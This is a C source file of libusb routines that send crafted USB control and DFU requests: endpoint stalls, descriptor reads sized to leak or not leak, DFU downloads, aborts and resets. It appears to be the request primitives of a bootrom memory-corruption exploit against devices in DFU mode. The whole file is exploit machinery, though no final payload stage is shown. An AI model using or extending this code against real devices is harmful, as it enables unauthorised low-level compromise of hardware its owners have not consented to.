#include "./inc/transfer.h"

unsigned char io_buf[0x800]; //0x800 is the maximum number of bytes we could send/recieve anyway

void stall_data_and_leak(libusb_device_handle *device_handle) //TODO: better understanding of this
{
    uint8_t bmRequestType = STANDARD_USB_REQ | USB_REQ_DEVICE2HOST;
    uint8_t bRequest = USB_REQ_GET_DESCRIPTOR;
    uint16_t wValue = (USB_DT_STRING << 8) | 0x4; // A request for the 4th string descriptor
    uint16_t wIndex = 0;                          // Doesn't matter
    uint16_t wLength = 0x80;                      // The number of bytes we want to recieve
    transfer(device_handle, true, bmRequestType, bRequest, wValue, wIndex, wLength, NULL);
}

void stall_only(libusb_device_handle *device_handle)
{
    uint8_t bmRequestType = STANDARD_USB_REQ | USB_REQ_RECIPIENT_ENDPOINT;
    uint8_t bRequest = USB_REQ_SET_FEATURE;
    uint16_t wValue = USB_FEATURE_ENDPOINT_HALT;
    uint16_t wIndex = EP0_IN;
    uint16_t wLength = 0;
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, io_buf);
}

void dont_leak(libusb_device_handle *device_handle)
{
    uint8_t bmRequestType = STANDARD_USB_REQ | USB_REQ_DEVICE2HOST;
    uint8_t bRequest = USB_REQ_GET_DESCRIPTOR;
    uint16_t wValue = (USB_DT_STRING << 8) | 0x4; // A request for the 4th string descriptor
    uint16_t wIndex = 0;                          // Doesn't matter
    uint16_t wLength = 0x81;                      // The number of bytes we want to recieve
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, io_buf);
}

void leak(libusb_device_handle *device_handle)
{
    uint8_t bmRequestType = STANDARD_USB_REQ | USB_REQ_DEVICE2HOST;
    uint8_t bRequest = USB_REQ_GET_DESCRIPTOR;
    uint16_t wValue = (USB_DT_STRING << 8) | 0x4; // A request for the 4th string descriptor
    uint16_t wIndex = 0;                          // Doesn't matter
    uint16_t wLength = 0x80;                      // The number of bytes we want to recieve
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, io_buf);
}

void set_length(libusb_device_handle *device_handle, int len)
{
    uint8_t bmRequestType = CLASS_USB_REQ | USB_REQ_RECIPIENT_INTERFACE;
    uint8_t bRequest = DFU_DOWNLOAD;
    uint16_t wValue = 0;
    uint16_t wIndex = 0;
    uint16_t wLength = len; // The number of bytes we want to send
    transfer(device_handle, true, bmRequestType, bRequest, wValue, wIndex, wLength, NULL);
}

void dfu_abort(libusb_device_handle *device_handle)
{
    uint8_t bmRequestType = CLASS_USB_REQ | USB_REQ_RECIPIENT_INTERFACE;
    uint8_t bRequest = DFU_ABORT;
    uint16_t wValue = 0;
    uint16_t wIndex = 0;
    uint16_t wLength = 0;
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, io_buf);
}

void stall_setup_requests(libusb_device_handle *device_handle) //TODO: better understanding of this
{
    uint8_t bmRequestType = STANDARD_USB_REQ | USB_REQ_RECIPIENT_ENDPOINT;
    uint8_t bRequest = USB_REQ_SET_FEATURE;
    uint16_t wValue = USB_FEATURE_ENDPOINT_HALT;
    uint16_t wIndex = EP0_IN; // endpoint to be stalled
    uint16_t wLength = 0;
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, io_buf);
}

void download_to_device(libusb_device_handle *device_handle, unsigned char *data, uint16_t length)
{
    uint8_t bmRequestType = CLASS_USB_REQ | USB_REQ_RECIPIENT_INTERFACE;
    uint8_t bRequest = DFU_DOWNLOAD;
    uint16_t wValue = 0;
    uint16_t wIndex = 0;
    uint16_t wLength = length;
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, data);
}

void get_status(libusb_device_handle *device_handle)
{
    uint8_t bmRequestType = CLASS_USB_REQ | USB_REQ_RECIPIENT_INTERFACE;
    uint8_t bRequest = DFU_GET_STATUS;
    uint16_t wValue = 0;
    uint16_t wIndex = 0;
    uint16_t wLength = 0;
    transfer(device_handle, false, bmRequestType, bRequest, wValue, wIndex, wLength, io_buf);
}

void complete_reset(libusb_device_handle *device_handle)
{
    download_to_device(device_handle, io_buf, 0);
    get_status(device_handle);
    get_status(device_handle);
    get_status(device_handle);
    libusb_reset_device(device_handle);
}